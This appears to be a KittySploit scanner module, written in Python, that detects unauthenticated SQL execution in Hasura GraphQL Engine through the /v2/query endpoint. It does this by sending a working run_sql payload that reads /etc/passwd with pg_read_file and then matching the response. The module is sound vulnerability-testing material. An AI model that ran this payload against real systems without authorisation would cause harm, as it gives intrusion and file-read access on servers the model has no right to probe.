#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/que."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hasura GraphQL Engine - Remote Code Execution Detection',
        'description': "Hasura GraphQL Engine allows remote unauthenticated users to execute arbitrary SQL statements via the '/v2/query' endpoint (aka remote code execution).",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'graphql', 'edb', 'hasura', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/49802'],
    }

    def run(self):
        path = '/v2/query'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "type": "bulk",\n  "source": "default",\n  "args":[\n    {\n      "type": "run_sql",\n      "args": {\n        "source":"default",\n        "sql":"SELECT pg_read_file(\'/etc/passwd\',0,100000);",\n        "cascade": false,\n        "read_only": false\n      }\n    }\n  ]\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='Hasura GraphQL Engine - Remote Code Execution detected', path=path)
            return True
        return False

